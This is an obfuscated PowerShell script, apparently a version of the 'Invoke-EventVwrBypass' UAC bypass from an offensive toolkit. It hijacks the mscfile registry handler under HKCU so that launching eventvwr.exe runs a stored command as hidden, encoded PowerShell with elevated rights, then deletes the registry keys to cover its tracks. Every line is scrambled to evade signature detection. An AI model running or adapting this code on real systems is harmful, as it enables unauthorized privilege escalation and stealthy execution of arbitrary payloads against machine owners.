 seT-ITem  ("{0}{3}{2}{1}"-f 'vAr',':DL1','aBle','I') ([tYpE]("{1}{2}{0}" -f 't','e','nvIrONmEn') )  ;  function InV`Ok`e-ev`ENtVWrb`yPaSs {


    [CmdletBinding(SUpporTSShouldPRoCesS = ${T`RUe}, CONFiRmImpAct = "med`iuM")]
    Param (
        [Parameter(ManDATOrY = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMMA`Nd},

        [Switch]
        ${for`cE}
    )
    ${CO`NsEn`Tp`R`omPT} = (.("{0}{3}{2}{1}{4}" -f'G','p','-ItemPro','et','erty') ((("{9}{0}{3}{6}{2}{12}{1}{10}{8}{5}{13}{11}{4}{7}" -f 'T','}Windows','{','WARE','{0}Sys','entVer','{0}Microsoft','tem','urr','HKLM:{0}SOF','{0}C','0}Policies','0','sion{'))-f[CHAr]92))."cOn`S`ENtPrO`m`P`TBEHAvIOrADMIN"
    ${S`eCUrEdesktO`P`P`RoMPT} = (&("{1}{4}{2}{0}{3}" -f 't','Get-Item','er','y','Prop') (("{4}{7}{3}{16}{14}{17}{1}{2}{6}{18}{15}{5}{9}{0}{10}{8}{11}{12}{13}" -f 'olici','wsKDJC','ur',':KDJS','HK','rsion','re','LM','s','KDJP','e','KDJS','yst','em','DJM','Ve','OFTWAREK','icrosoftKDJWindo','nt')).REplaCE('KDJ','\'))."pro`MptonsEcU`R`EdESK`TOp"

    if(($(&("{0}{1}" -f'who','ami') ("{2}{1}{0}"-f 'ps','grou','/')) -like ("{2}{1}{0}{3}" -f '1-5-32-544','S-','*','*'))."LE`N`gTH" -eq 0) {
        ("{6}{0}{5}{4}{9}{2}{12}{11}{10}{3}{1}{7}{8}" -f'Curre','o','a loca','rat','user no','nt ','[!] ','r','!','t ','t','minis','l ad')
        Throw (("{1}{5}{0}{8}{7}{9}{2}{3}{4}{6}"-f ' not','C','ni','st','rato','urrent user','r!',' loca',' a','l admi'))
    }
    if (($(&("{1}{2}{0}" -f'mi','w','hoa') ("{2}{1}{0}" -f's','oup','/gr')) -like ("{0}{1}{3}{2}"-f'*S-1-1','6-8','*','192'))."LEn`GtH" -eq 0) {
        ("{2}{0}{4}{5}{6}{1}{3}"-f'No','e','[!] ','ss!','t',' in a med','ium integrity proc')
        Throw (("{7}{2}{0}{3}{4}{6}{1}{5}"-f 'um','es','edi',' i','ntegri','s!','ty proc','Not in a m'))
    }

    if(${cONSE`N`TPRompt} -Eq 2 -And ${sEcuR`e`DEskt`o`PP`R`omPT} -Eq 1){
        ((("{0}{4}{6}{1}{3}{8}{12}{10}{9}{2}{7}{13}{11}{15}{14}{5}" -f'U','o bH','ule doe','FAl','AC','g.',' is set t','s not byp','ways Not','is mod','Th','s ','ifybHF. ','as',' settin','this'))."re`pl`Ace"('bHF',[STrIng][CHaR]39))
        exit
    }
    else{
        

        
        ${Re`gp`AtH} = ((("{2}{0}{1}{7}{5}{6}{4}{3}"-f 'tw','aret','HKCU:Sof','date','tt7rWindowst7rUp','s','of','7rMicro')).("{2}{0}{1}"-f 'ePl','ace','R').Invoke('t7r','\'))
        ${PAr`Ts} = ${rEGp`A`TH}.("{0}{1}"-f's','plit').Invoke('\');
        ${pA`Th} = ${REGp`A`TH}.("{0}{1}" -f 's','plit').Invoke("\")[0..(${pa`RtS}."cOu`NT" -2)] -join '\';
        ${nA`me} = ${PAR`Ts}[-1];
        ${Nu`ll} = .("{2}{1}{3}{0}" -f 'perty','et','S','-ItemPro') -Force -Path ${p`Ath} -Name ${na`mE} -Value ${c`OmM`AnD};

        ${mscCOm`MaN`d`pA`TH} = ((("{0}{9}{5}{7}{6}{10}{15}{14}{16}{1}{13}{4}{12}{3}{2}{8}{11}"-f'HK','VkE','el','sh','file',':','E','Vk','lVkEo','CU','So','penVkEcommand','VkE','msc','wa','ft','reVkEClasses'))."reP`LA`ce"('VkE',[STring][cHaR]92))
        ${l`AU`NC`HeRCoMManD} = ${Psh`ome} + '\' + ('powe'+'rsh'+'ell.exe'+' '+'-No'+'P '+'-NonI'+' '+'-c'+' '+('dMqx'+'=dMq'+'((gp ')."RepLA`Ce"('dMq',[sTRinG][cHaR]36)+(('H'+'K'+'CU:So'+'ft'+'waresQRMicroso'+'ftsQRW'+'indo'+'w'+'s ')  -rEPLacE  'sQR',[cHar]92)+'U'+'pdate)'+'.'+'Update'+'); '+'p'+'owe'+'rshel'+'l '+'-No'+'P '+'-'+'Non'+'I '+'-W'+' '+'Hidde'+'n'+' '+'-enc'+' '+('K'+'ow'+'x')."REp`lACe"('Kow',[sTrING][CHar]36))
        
        if (${fo`R`ce} -or ((.("{4}{3}{0}{2}{1}"-f 't-I','y','temPropert','e','G') -Path ${MSCco`mmANDp`Ath} -Name (("{2}{0}{1}" -f 'defa','ult)','(')) -ErrorAction ("{0}{4}{1}{2}{3}" -f 'Si','t','ly','Continue','len')) -eq ${n`Ull})){
            &("{1}{2}{0}"-f 'em','New','-It') ${m`SCCO`MMA`NDpaTh} -Force |
                .("{1}{0}{4}{3}{2}"-f '-I','New','roperty','emP','t') -Name ("{1}{0}{2}" -f'ault','(Def',')') -Value ${lAUN`c`h`E`RcoMM`AND} -PropertyType ("{0}{1}"-f 'stri','ng') -Force | .("{1}{0}{2}" -f 't-Nu','Ou','ll')
        }else{
            .("{3}{2}{1}{0}" -f 'ing','rn','rite-Wa','W') ("{7}{10}{1}{4}{9}{8}{0}{3}{5}{2}{6}" -f 'sin','dy ex','or','g ','i','-F','ce','Ke','ts, consider u','s','y alrea')
            exit
        }

        if (&("{0}{1}{2}" -f 'Test','-P','ath') ${m`sCcom`mAND`PatH}) {
            .("{0}{3}{1}{2}" -f 'Writ','erbos','e','e-V') ("{4}{7}{1}{8}{0}{5}{2}{3}{13}{9}{6}{11}{12}{10}"-f'istr','d','e','ntri','Creat','y ','h','e',' reg','o ','ion','ijack t','he msc extens','es t')
        }else{
            .("{1}{2}{0}" -f'Warning','Wri','te-') ("{0}{11}{2}{10}{7}{9}{8}{3}{1}{5}{6}{4}"-f 'Fa','try','l','s','ing',' key, exi','t','create','i',' reg','ed to ','i')
            exit
        }

        ${Ev`e`NT`Vwr`PatH} = &("{0}{1}{2}" -f'Joi','n-Pa','th') -Path (  ( get-ITEM ("{1}{2}{0}"-f'l1','VARiAB','Le:D'))."Val`UE"::("{0}{3}{2}{1}" -f'G','erPath','Fold','et').Invoke(("{0}{1}{2}" -f'S','ys','tem'))) -ChildPath ("{2}{1}{3}{0}"-f 'wr.exe','vent','e','v')
        
        if (${PscM`dlEt}.("{4}{1}{2}{0}{3}"-f 'oce','ul','dPr','ss','Sho').Invoke(${E`VEN`T`VWR`pAtH}, ("{1}{2}{3}{0}" -f 'ess','Star','t p','roc'))) {
            ${P`ROc`ESs} = .("{3}{1}{0}{2}" -f '-Proces','t','s','Star') -FilePath ${E`VE`NTVwrpatH} -PassThru
            &("{0}{1}{2}" -f'Write-Ver','b','ose') ("{2}{3}{0}{4}{5}{1}"-f'ed e','.exe','Star','t','vent','vwr')
        }

        
        .("{3}{2}{1}{0}"-f'erbose','te-V','i','Wr') ("{7}{10}{1}{9}{5}{4}{3}{8}{0}{6}{2}"-f 'r ','ng','load','ig',' to tr','seconds','pay','S','ge',' 5 ','leepi')
        if (-not ${ps`BoUNDp`A`RameteRs}[("{1}{0}" -f'If','What')]) {
            &("{0}{2}{1}"-f 'Sta','t-Sleep','r') -Seconds 5
        }

        ${M`s`CfILepa`Th} = ((("{3}{4}{6}{1}{0}{2}{5}"-f'0}Classes{','are{','0}ms','HKCU:{0','}Soft','cfile','w'))  -F[cHAR]92)
        ${p`AYloadP`ATh} = ((("{5}{0}{6}{2}{8}{9}{4}{7}{1}{3}"-f 'Sof','ft','w','{0}Windows','{0}','HKCU:','t','Microso','ar','e')) -F [ChaR]92)
        ${payLo`A`dkeY} = ("{0}{1}" -f 'Updat','e')

        if (.("{0}{1}{2}"-f 'Test','-P','ath') ${Mscf`i`lepATh}) {
            
            .("{2}{0}{1}"-f 'e-Ite','m','Remov') ${m`Sc`FiLEpA`Th} -Recurse -Force
            .("{2}{3}{4}{1}{0}"-f'ty','Proper','R','emove-Ite','m') -Force -Path ${pa`yL`O`ADpaTh} -Name ${paylO`AD`KEY}
            .("{1}{2}{3}{0}"-f 'e','Write','-Verbo','s') ("{6}{0}{5}{4}{7}{1}{2}{3}"-f'emove','n','tri','es',' registry ','d','R','e')
        }

        if(.("{2}{0}{1}" -f'-Proces','s','Get') -Id ${prO`cE`ss}."i`d" -ErrorAction ("{2}{1}{3}{0}"-f'nue','on','SilentlyC','ti')){
            .("{3}{1}{0}{2}" -f 'oce','p-Pr','ss','Sto') -Id ${PRoC`e`SS}."i`D"
            .("{1}{2}{0}"-f'se','Write-Ver','bo') ("{5}{8}{1}{6}{3}{2}{4}{0}{7}" -f'e','ni','ro','ntvwr p','c','Ki','ng eve','ss','lled run')
        }
    }
}